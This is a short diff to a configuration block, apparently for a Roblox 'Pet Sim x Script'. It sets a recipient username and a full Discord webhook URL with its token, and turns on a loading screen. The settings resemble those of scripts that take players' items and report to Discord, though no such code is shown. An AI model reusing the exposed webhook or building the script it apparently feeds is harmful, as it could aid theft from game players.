@@ -2,7 +2,7 @@ Username = "DaviMisterYT"
 
 WebHook = "https://discord.com/api/webhooks/1099349740690345984/pDExLeF893R-hmAG0vcwP22-bW8gyeWiLmw2xMhztjQ9lYK0bI42LpVNbVUrWC6Z9EEk"
 
-loadingscreen = false
+loadingscreen = true
 
 _G.CustomScriptName = "Pet Sim x Script"
 
